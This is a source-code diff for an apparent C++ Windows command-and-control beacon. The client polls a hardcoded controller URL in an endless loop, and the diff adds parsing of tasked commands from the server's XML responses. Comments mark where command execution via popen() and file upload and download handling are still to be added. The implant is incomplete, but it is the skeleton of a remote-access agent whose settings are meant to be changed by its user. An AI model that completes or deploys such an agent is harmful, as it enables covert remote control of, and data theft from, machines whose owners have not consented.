@@ -1,10 +1,10 @@
-#include <cctype>		// URL encoding
-#include <iomanip>		// URL encoding
-#include <sstream>		// URL encoding
-#include <string>		// URL encoding
-#include "stdafx.h"		// WinHttpClient
-#include "WinHttpClient.h"	// WinHttpClient
-#include <Psapi.h>		// GetModuleBaseName()
+#include <cctype>			// URL encoding
+#include <iomanip>			// URL encoding
+#include <sstream>			// URL encoding
+#include <string>			// URL encoding
+#include "stdafx.h"			// WinHttpClient
+#include "WinHttpClient.h"		// WinHttpClient
+#include <Psapi.h>			// GetModuleBaseName()
 #include <iostream>
 #include <string>
 #include <Windows.h>
@@ -20,24 +20,42 @@ wstring GetArchitecture();
 string UTF8Encode(const wstring &PostData);
 string URLEncode(const string &Value);
 wstring Beacon(const wstring &BeaconURL, const wstring &UserAgent);
+wstring ExtractString(wstring Source, wstring Start, wstring End);
 // End of function prototypes
 
 #pragma comment(lib, "Psapi.lib") // GetModuleBaseName()
 
-
 int main()
 {
-	wstring BeaconURL = L"http://192.168.1.100/beacon.php"; // **** Needs changed by user ****
-	wstring UserAgent = L"Test";				// **** Needs changed by user ****
-	int BeaconInterval = 10000;				// **** Needs changed by user ****
+	wstring BeaconURL = L"https://192.168.1.100/beacon.php"; // **** Needs changed by user ****
+	wstring UserAgent = L"Test";				 // **** Needs changed by user ****
+	int BeaconInterval = 10000;				 // **** Needs changed by user ****
 
 	// Infinite loop
 	while (true)
 	{
-		Beacon(BeaconURL, UserAgent);
+		wstring BeaconResponse = Beacon(BeaconURL, UserAgent); // Beacons and stores response in "BeaconResponse"
+
+		// Code modified from http://stackoverflow.com/questions/2340281/check-if-a-string-contains-a-string-in-c
+		// If BeaconResponse contains a tasked command
+		if (BeaconResponse.find(L"<action>command</action>") != wstring::npos)
+		{
+			// Parses task information
+			wstring id = ExtractString(BeaconResponse, L"<id>", L"</id>");
+			wstring action = ExtractString(BeaconResponse, L"<action>", L"</action>");
+			wstring secondary = ExtractString(BeaconResponse, L"<secondary>", L"</secondary>");
+
+			wcout << secondary << endl;
+			// Needs call to popen() here with the extracted command
+		}
+
+		// If statement to determine if BeaconResponse contains <action>upload</action> here
+
+		// If statement to determine if BeaconResponse contains <action>download</action> here
+
 		Sleep(BeaconInterval);
 	}
-	
+
 	return 0;
 }
 // End of main() function
@@ -206,3 +224,30 @@ wstring Beacon(const wstring &BeaconURL, const wstring &UserAgent)
 	return Response;
 }
 // End of Beacon() function
+
+
+// Code modified from http://blog.mrroa.com/2013/06/06/tiptrick-how-to-retrieve-a-sub-string-between-two-delimiters-using-c/
+// Extracts task information
+// IE: Calling ExtractString(BeaconResponse, L"<id>", L"</id>"); will return the task ID
+// Returns "Stripped" wstring
+wstring ExtractString(wstring Source, wstring Start, wstring End)
+{
+	wstring EmptyString;
+	size_t StartIndex = Source.find(Start);
+
+	// If the starting delimiter is not found - Exits function
+	if (StartIndex == string::npos)
+		return EmptyString;
+
+	// Adds the length of the delimiter to our starting index
+	// This will move us to the beginning of our substring.
+	StartIndex += Start.length();
+
+	// Looks for the end delimiter
+	wstring::size_type EndIndex = Source.find(End, StartIndex);
+
+	// Returns the substring between the start index and the end index
+	wstring Stripped = Source.substr(StartIndex, EndIndex - StartIndex);
+	return Stripped;
+}
+// End of ExtractString() function
